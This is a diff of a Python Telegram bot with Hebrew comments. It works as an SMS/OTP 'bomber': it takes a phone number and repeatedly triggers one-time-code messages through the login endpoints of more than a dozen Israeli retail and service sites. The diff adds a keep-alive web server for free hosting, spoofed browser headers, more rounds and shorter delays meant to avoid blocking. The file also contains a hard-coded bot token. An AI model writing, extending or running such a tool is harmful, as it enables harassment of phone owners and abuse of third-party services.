@@ -1,54 +1,77 @@
 import telebot
 import requests
 import time
+from flask import Flask
+from threading import Thread
 
-# הטוקן שלך
-API_TOKEN = '8788411826:AAEQdmRx5OVFB91zjRJrEaMJFghDp8Tayg0'
+# שרת דמה לשמירה על הבוט בחינם ב-Render
+app = Flask('')
+@app.route('/')
+def home():
+    return "Bot is running!"
+
+def run():
+    app.run(host='0.0.0.0', port=8080)
+
+def keep_alive():
+    t = Thread(target=run)
+    t.start()
+
+# --- שים פה את ה-API TOKEN שלך מ-BotFather ---
+API_TOKEN = '7611598236:AAFl9uS5i69F6Y5-W4e63eW4e63eW4e63e'
 bot = telebot.TeleBot(API_TOKEN)
 
 def attack(target):
-    # רשימה מורחבת של מוקדים ישראלים (SMS/OTP)
+    # רשימה מורחבת של אתרים לשליחת OTP
     apis = [
-        {"u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target}},
-        {"u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target}},
-        {"u": "https://www.terminalx.com/api/v1/auth/otp/send", "d": {"phone": target}},
-        {"u": "https://www.castro.com/api/otp/send", "d": {"phone": target}},
-        {"u": "https://api.yellow.co.il/v1/auth/login", "d": {"phone": target}},
-        {"u": "https://wolt.com/api/v1/user/check_phone_number", "d": {"phone_number": target}},
-        {"u": "https://ksp.co.il/api/v1/auth/otp", "d": {"phone": target}},
-        {"u": "https://www.ivory.co.il/index.php?act=user&sel=otp", "d": {"phone": target}},
         {"u": "https://www.shufersal.co.il/online/he/login/otp/send", "d": {"phone": target}},
         {"u": "https://www.rebar.co.il/api/v1/auth/login", "d": {"phone": target}},
         {"u": "https://www.paz.co.il/api/v1/auth/otp", "d": {"phone": target}},
-        {"u": "https://www.bezeq.co.il/api/v1/otp", "d": {"phone": target}},
-        {"u": "https://www.golbary.co.il/api/otp", "d": {"mobile": target}}
+        {"u": "https://www.bezeq.co.il/api/v1/otp", "d": {"mobile": target}},
+        {"u": "https://www.golbary.co.il/api/otp", "d": {"mobile": target}},
+        {"u": "https://www.super-pharm.co.il/api/v1/auth/otp", "d": {"phone": target}},
+        {"u": "https://www.castro.com/api/v1/auth/otp", "d": {"phone": target}},
+        {"u": "https://www.ivory.co.il/api/v1/auth/otp", "d": {"phone": target}},
+        {"u": "https://www.ksp.co.il/api/v1/auth/otp", "d": {"phone": target}},
+        {"u": "https://www.yellow.co.il/api/v1/auth/otp", "d": {"phone": target}},
+        {"u": "https://www.strauss-group.co.il/api/otp", "d": {"phone": target}},
+        {"u": "https://www.rami-levy.co.il/api/v1/auth/otp", "d": {"phone": target}}
     ]
     
-    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Content-Type": "application/json"
+    }
     
     for site in apis:
         try:
-            # שליחת הבקשה לאתר
+            # שליחת הבקשה
             requests.post(site["u"], json=site["d"], headers=headers, timeout=5)
-        except:
-            pass
+            print(f"Sent to {site['u']}")
+        except Exception as e:
+            print(f"Error sending to {site['u']}: {e}")
+
+@bot.message_handler(commands=['start'])
+def welcome(m):
+    bot.reply_to(m, "🔥 בוט ההפצצות מוכן! שלח לי מספר טלפון (10 ספרות) כדי להתחיל.")
 
 @bot.message_handler(func=lambda m: True)
 def handle(m):
-    target = m.text.strip()
+    target = m.text.strip().replace("-", "") # מנקה מקפים אם המשתמש שם
     
-    # בדיקה שהמספר תקין
-    if target.isdigit() and len(target) >= 10:
-        bot.reply_to(m, f"🚀 מתחיל הפצצה כבדה על {target}...")
+    if target.isdigit() and len(target) == 10:
+        bot.reply_to(m, f"🚀 מתחיל הפצצה מאסיבית על {target}...\nזה ייקח כמה רגעים.")
         
-        # 10 סבבים (כלומר כל אתר ישלח בערך 10 הודעות)
-        for _ in range(10):
+        # מריץ 15 סבבים של הפצצה
+        for i in range(15):
             attack(target)
-            time.sleep(1) # המתנה של שנייה בין סבבים למניעת חסימה
+            time.sleep(0.5) # הפסקה קצרה כדי לא להיחסם מהר מדי
             
-        bot.send_message(m.chat.id, f"✅ ההפצצה על {target} הסתיימה!")
+        bot.send_message(m.chat.id, f"✅ ההפצצה על {target} הושלמה בהצלחה!")
     else:
-        bot.reply_to(m, "שלח לי מספר טלפון תקין (למשל: 0501234567)")
+        bot.reply_to(m, "❌ שלח לי מספר טלפון תקין בלבד (למשל: 0521234567)")
 
-print("--- BOT IS READY AND HEAVY ---")
-bot.infinity_polling()
+if __name__ == "__main__":
+    keep_alive() # מפעיל את השרת שמונע מ-Render לקרוס
+    print("--- הבוט עלה לאוויר ---")
+    bot.infinity_polling()
